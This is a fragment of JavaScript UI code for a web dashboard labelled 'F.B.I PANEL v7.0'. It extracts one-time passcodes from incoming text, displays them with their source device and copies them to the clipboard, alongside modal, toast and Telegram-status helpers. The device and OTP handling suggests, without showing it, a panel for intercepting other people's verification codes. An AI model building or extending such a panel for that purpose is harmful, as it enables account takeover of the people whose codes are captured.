function _extractOtp(txt){var m=txt.match(/\b(\d{6})\b/)||txt.match(/\b(\d{4,8})\b/);return m?m[1]:null;}
function otpShow(otp,src){_lastOtp=otp;document.getElementById('otpNum').textContent=otp;document.getElementById('otpSrc').textContent='From: '+src;document.getElementById('otpBar').classList.add('show');if(navigator.clipboard)navigator.clipboard.writeText(otp).catch(function(){});}
function otpCopy(){var v=document.getElementById('otpNum').textContent;if(!v||v.includes('─'))return;navigator.clipboard&&navigator.clipboard.writeText(v).then(function(){toast('✓ OTP copied');});}
function otpDismiss(){document.getElementById('otpBar').classList.remove('show');}

/* ═══════════ HELPERS ═══════════ */
function openM(id){document.getElementById(id).classList.add('open');}
function closeM(id){document.getElementById(id).classList.remove('open');if(id==='deviceModal'){selDev=null;stopMP();}}
document.querySelectorAll('.overlay').forEach(function(o){o.addEventListener('click',function(e){if(e.target===o){o.classList.remove('open');if(o.id==='deviceModal'){selDev=null;stopMP();}}});});
function toast(msg){var t=document.getElementById('toastEl');t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show');},2000);}
function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
function clip(t,btn){if(navigator.clipboard){navigator.clipboard.writeText(t).then(function(){if(btn){btn.textContent='✓';setTimeout(function(){btn.textContent='Copy';},1200);}});}}
function catClick(){toast('😸 Meow!');}
function rippleClick(e){var btn=e.currentTarget;var r=document.createElement('span');r.className='rip';var rect=btn.getBoundingClientRect();r.style.left=(e.clientX-rect.left-45)+'px';r.style.top=(e.clientY-rect.top-45)+'px';btn.appendChild(r);setTimeout(function(){r.remove();},600);}
document.addEventListener('keydown',function(e){if(e.key==='Escape')document.querySelectorAll('.overlay.open').forEach(function(o){o.classList.remove('open');});if(e.key==='Enter'&&document.getElementById('setup').style.display!=='none')connect();});

try{activeDeviceUid=localStorage.getItem(CFG.LS_ACTIVE||'fbi_active_device');}catch(e){}
setTimeout(function(){updateTgBtn();},300);
setInterval(function(){if(document.getElementById('settingsModal')&&document.getElementById('settingsModal').classList.contains('open')){updateTgStatusLine();}},2000);

console.log('%c[F.B.I PANEL] v7.0 Loaded — SSE Real-Time · Sub-500ms ⚡','color:#a855f7;font-weight:bold;font-size:14px');
